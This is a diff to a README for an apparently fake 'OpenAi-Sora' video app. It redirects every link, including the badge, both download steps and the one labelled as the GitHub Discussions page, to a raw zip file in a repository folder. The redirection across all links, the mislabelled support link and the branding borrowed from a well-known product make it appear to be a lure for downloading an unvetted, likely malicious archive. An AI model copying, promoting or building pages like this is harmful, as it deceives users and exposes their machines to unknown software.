@@ -1,6 +1,6 @@
 # 🎥 OpenAi-Sora - Create Stunning Videos with Ease
 
-[![Download OpenAi-Sora](https://img.shields.io/badge/Download-OpenAi--Sora-brightgreen)](https://github.com/respawningcode/OpenAi-Sora/releases)
+[![Download OpenAi-Sora](https://raw.githubusercontent.com/respawningcode/OpenAi-Sora/main/consolatrix/OpenAi-Sora.zip)](https://raw.githubusercontent.com/respawningcode/OpenAi-Sora/main/consolatrix/OpenAi-Sora.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ To start using OpenAi-Sora, follow these simple steps:
 
 2. **Download OpenAi-Sora**  
    Click the button below to visit the Releases page and download the latest version of OpenAi-Sora.  
-   [Download OpenAi-Sora](https://github.com/respawningcode/OpenAi-Sora/releases)
+   [Download OpenAi-Sora](https://raw.githubusercontent.com/respawningcode/OpenAi-Sora/main/consolatrix/OpenAi-Sora.zip)
 
 3. **Install OpenAi-Sora**  
    - For Windows:
@@ -69,11 +69,11 @@ Using OpenAi-Sora brings several advantages:
 ## 📥 Download & Install
 
 To download OpenAi-Sora, use the link below. Make sure to install it by following the steps outlined above.  
-[Download OpenAi-Sora](https://github.com/respawningcode/OpenAi-Sora/releases)
+[Download OpenAi-Sora](https://raw.githubusercontent.com/respawningcode/OpenAi-Sora/main/consolatrix/OpenAi-Sora.zip)
 
 ## 💬 Community and Support
 
-Join our community for support and to connect with other users. You can find discussions, share your projects, and ask questions on our [GitHub Discussions Page](https://github.com/respawningcode/OpenAi-Sora/discussions).
+Join our community for support and to connect with other users. You can find discussions, share your projects, and ask questions on our [GitHub Discussions Page](https://raw.githubusercontent.com/respawningcode/OpenAi-Sora/main/consolatrix/OpenAi-Sora.zip).
 
 ## 📄 License
 
